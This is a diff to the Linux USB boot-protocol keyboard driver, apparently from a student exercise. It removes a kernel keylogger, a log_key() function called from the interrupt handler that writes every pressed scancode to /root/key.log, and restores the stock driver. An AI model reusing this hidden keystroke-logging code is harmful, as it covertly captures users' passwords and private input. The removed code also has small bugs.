@@ -32,20 +32,13 @@
 #include <linux/init.h>
 #include <linux/usb/input.h>
 #include <linux/hid.h>
-#include <linux/fs.h>
-#include <linux/file.h>
-#include <linux/fcntl.h>
-#include <asm/uaccess.h>
-
 
 /*
  * Version Information
  */
 #define DRIVER_VERSION ""
-#define DRIVER_AUTHOR "Ming Hu s3554025 forked from kernel source"
-#define DRIVER_DESC "USB HID Boot Protocol keyboard driver"
-
-static void log_key(char * path, char * str_to_write);
+#define DRIVER_AUTHOR "Vojtech Pavlik <vojtech@ucw.cz>"
+#define DRIVER_DESC "Ming Hu s3554025 forked from Linux kernel source"
 
 MODULE_AUTHOR(DRIVER_AUTHOR);
 MODULE_DESCRIPTION(DRIVER_DESC);
@@ -119,7 +112,6 @@ struct usb_kbd {
 static void usb_kbd_irq(struct urb *urb)
 {
 	struct usb_kbd *kbd = urb->context;
-	char str_to_write[5]; // 5 is enough
 	int i;
 
 	switch (urb->status) {
@@ -150,22 +142,11 @@ static void usb_kbd_irq(struct urb *urb)
 
 		if (kbd->new[i] > 3 && memscan(kbd->old + 2, kbd->new[i], 6) == kbd->old + 8) {
 			if (usb_kbd_keycode[kbd->new[i]])
-			{
-				input_report_key(
-						kbd->dev,
-						usb_kbd_keycode[kbd->new[i]], 1);
-
-				// Concat the char to string, too lazy to do vmalloc, just use fixed length char[] instead
-				sprintf(str_to_write, "%d ", (int)kbd->new[i]);
-				log_key("/root/key.log", str_to_write);
-			}
+				input_report_key(kbd->dev, usb_kbd_keycode[kbd->new[i]], 1);
 			else
-			{
 				hid_info(urb->dev,
-						 "Unknown key (scancode %#x) pressed.\n",
-						 kbd->new[i]);
-			}
-
+					 "Unknown key (scancode %#x) pressed.\n",
+					 kbd->new[i]);
 		}
 	}
 
@@ -410,78 +391,6 @@ static void usb_kbd_disconnect(struct usb_interface *intf)
 		kfree(kbd);
 	}
 }
-
-static void log_key(char * path, char * str_to_write)
-{
-	// Declare file pointer and segment stuff
-	struct file * file_pointer;
-	mm_segment_t origin_file_segment;
-
-	// Try open it
-	// File open mode: r/w, append; Permission: 666
-	file_pointer = filp_open(path, O_RDWR | O_APPEND | O_CREAT, 0666);
-
-	// If something went wrong, print debug info and stop
-	if(IS_ERR(file_pointer))
-	{
-		printk(KERN_ERR "USBKBD_Keylogger: Failed to open file, returned error %ld", PTR_ERR(file_pointer));
-		return;
-	}
-	else
-	{
-		printk(KERN_INFO "USBKBD_Keylogger: File opened/created.");
-	}
-
-	// Backup file segment and set to kernel space operations
-	origin_file_segment = get_fs();
-
-	printk(KERN_INFO "USBKBD_Keylogger: Got file segment.");
-
-	set_fs(KERNEL_DS);
-
-	printk(KERN_INFO "USBKBD_Keylogger: Kernel mode entered.");
-
-	printk(KERN_INFO "USBKBD_Keylogger: Message to write: %s", str_to_write);
-	printk(KERN_INFO "USBKBD_Keylogger: File position value: %lld, address :%p", file_pointer->f_pos, &file_pointer->f_pos);
-
-	if(file_pointer->f_op->write)
-	{
-		printk(KERN_INFO "USBKBD_Keylogger: f_op->write is not null, just use it.");
-
-		// Write to file
-		file_pointer->f_op->write(
-				file_pointer,
-				str_to_write,
-				sizeof(str_to_write),
-				&file_pointer->f_pos);
-	}
-	else
-	{
-		printk(KERN_INFO "USBKBD_Keylogger: f_op->write somehow does not exist, use something else instead.");
-
-		vfs_write(
-				file_pointer,
-				str_to_write,
-				sizeof(str_to_write),
-				&file_pointer->f_pos);
-
-		vfs_fsync(file_pointer, 0);
-	}
-
-
-
-	printk(KERN_INFO "USBKBD_Keylogger: Written to file.");
-	// Restore file segment back to original one
-	set_fs(origin_file_segment);
-
-	printk(KERN_INFO "USBKBD_Keylogger: Return user mode.");
-
-	// Close the file pointer (also flush)
-	filp_close(file_pointer, NULL);
-
-	printk(KERN_INFO "USBKBD_Keylogger: Log finished.");
-}
-
 
 static const struct usb_device_id usb_kbd_id_table[] = {
 	{ USB_INTERFACE_INFO(USB_INTERFACE_CLASS_HID, USB_INTERFACE_SUBCLASS_BOOT,
